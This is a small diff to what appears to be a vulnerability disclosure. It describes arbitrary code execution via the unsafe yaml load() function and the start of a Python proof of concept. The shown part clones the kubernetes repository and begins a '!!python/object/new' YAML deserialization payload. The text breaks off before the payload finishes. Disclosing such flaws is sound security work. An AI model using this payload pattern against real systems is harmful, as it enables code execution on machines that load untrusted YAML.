@@ -4,7 +4,8 @@
 This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**. command is executed when the .py file loads the malicious rules.yaml file.  
 # Exploit code
 **Python File**
-```pythonimport os
+```python
+import os
 os.system('git clone https://github.com/kubernetes/kubernetes.git')
 os.chdir('kubernetes/')
 exploit = '''!!python/object/new:type
